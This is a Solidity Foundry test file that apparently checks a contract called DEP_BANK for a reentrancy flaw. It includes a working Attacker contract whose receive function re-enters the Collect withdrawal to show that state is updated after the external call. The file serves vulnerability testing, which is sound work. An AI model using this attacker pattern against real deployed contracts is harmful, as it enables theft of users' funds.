
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/DEP_BANK.sol";

contract TestReentrancyDEP_BANK is Test {
    DEP_BANK public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new DEP_BANK();
        
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.SetMinSum(0);
        _contractUnderTest.Initialized();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal > 0.01 ether && attackVal < type(uint128).max);

        // Fund the Victim
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // We deposit 2x attackVal to ensure the re-entrant call doesn't revert due to underflow 
        // (since Solidity 0.8+ panics on underflow), allowing us to verify the state inconsistency.
        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: State was updated before external call");
    }

    receive() external payable {}
}

contract Attacker {
    DEP_BANK public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;
    uint256 public initialDeposit;

    constructor(address victimAddress) { 
        _victim = DEP_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        initialDeposit = msg.value;
        
        _victim.Deposit{value: initialDeposit}();
    }

    function attack(uint256 val) public {
        _victim.Collect(val);
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            // Check if the balance in the victim contract has been updated yet.
            // If balances[this] is still equal to the initial deposit, the state update hasn't happened.
            uint256 currentBalance = _victim.balances(address(this));
            
            if (currentBalance == initialDeposit) {
                exploitSucceeded = true;
            }

            attackCallCount++;
            
            // Re-enter the contract
            _victim.Collect(storedAttackVal);
        }
    }
}
